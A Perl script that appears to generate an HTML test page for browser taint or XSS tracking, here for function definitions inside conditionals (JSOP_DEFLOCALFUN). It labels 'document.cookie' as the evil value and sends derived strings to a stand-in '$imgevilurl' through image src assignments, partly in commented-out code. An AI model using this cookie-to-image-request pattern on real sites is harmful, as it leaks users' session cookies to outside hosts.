#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_DEFLOCALFUN";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		var notevil = 42;
		var url = "$imgevilurl?normal=";
		function testfunc() {
			function x() {
			}
			url = url + x; 
		}		
		testfunc();
		document.images[0].src = url;
		
/*		// becomes closures
		// if with evil val 
		var url2 = "$imgevilurl?if=";
		function testfunc2() {
			if ($evil) {
				function y() {
				}
			}
			url2 = url2 + y;
		}
		testfunc2();
		document.images[1].src = url2;
		// normal usage 
		var url3 = "$imgevilurl?isevil=";
		function testfunc3() {
			if ($evil) {
				function z() {
				}
			}
			url3 = url3 + z;
		}
		testfunc3();
		document.images[2].src = url3;
*/		
		
    </script>
|;

require "xss_basic_footer.pl";